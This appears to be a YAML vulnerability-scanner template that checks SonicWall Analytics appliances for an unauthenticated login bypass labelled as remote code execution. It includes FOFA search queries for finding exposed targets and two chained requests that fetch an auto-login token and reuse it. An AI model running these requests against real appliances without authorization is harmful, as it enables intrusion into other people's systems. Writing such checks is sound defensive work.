id: sonicwall-analytics-unauth-rce

info:
  name: SonicWall Analytics Unauth RCE
  author: todo
  severity: critical
  verified: true
  description: |
    fofa: app="SonicWall"
    fofa: title="SonicWall Analytics Login"

rules:
  r0:
    request:
      method: GET
      path: /appliance/autoApplianceLogin?action=autoLoginToken
      headers:
        Cookie: JSESSIONID=2DDDF53FC7D148A8813B64883B338B51
    expression: response.status == 200 && response.body.bcontains(b'"autoLoginToken":')
    output:
      search: '":\"(?P<token>.+?)\"}".bsubmatch(response.body)'
      token: search["token"]
  r1:
    request:
      method: GET
      path: /appliance/autoApplianceLogin?action=autoLogin&token={{token}}
      headers:
        Cookie: JSESSIONID=2DDDF53FC7D148A8813B64883B338B51
    expression: response.status == 200 && response.body.bcontains(b'name="clientHash"') && response.body.bcontains(b'name="password"')
expression: r0() && r1()